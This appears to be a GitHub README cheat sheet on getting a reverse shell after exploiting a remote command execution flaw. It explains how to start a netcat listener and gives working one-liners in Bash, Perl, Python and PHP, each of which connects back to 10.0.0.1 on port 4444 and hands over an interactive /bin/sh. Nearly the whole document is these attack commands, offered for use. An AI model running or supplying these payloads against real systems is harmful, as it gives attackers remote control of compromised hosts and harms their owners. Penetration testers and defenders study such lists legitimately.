# Getting reverse shell HOWTOs &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/shell1.png" width="30"/>
After having success with a remote command execution vulnerability, you'll probably wish to get an interactive shell. You will see that your target cannot execute any reverse shell scripting languages; it's limited to the current vulnerable application language.  
  
Before starting, you will need netcat installed on your listener host.
  
**Ubuntu/Debian distrib:** *sudo apt-get install nc -y*  
**Other Linux distros (CentOS, RedHat, ...):** *yum install nc -y*  
Now that netcat is successfully installed on your listener host, type: *nc -l -v 4444*
  
You will find below different ways in obtaining a reverse shell in multiple langs.  
  
## Bash &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/bourne_again.jpg" width="20"/>
Based that your local IP would be *10.0.0.1* and listener port on netcat is *4444*
```
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```
  
## Perl &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/perl.jpg" width="50"/>
```
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
  
## Python &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/python.jpg" width="70"/>
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/php.png" width="40"/>
Assuming that the TCP connection is using file descriptor 3. If it doesn't work, try 4, 5, 6...
  
```
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
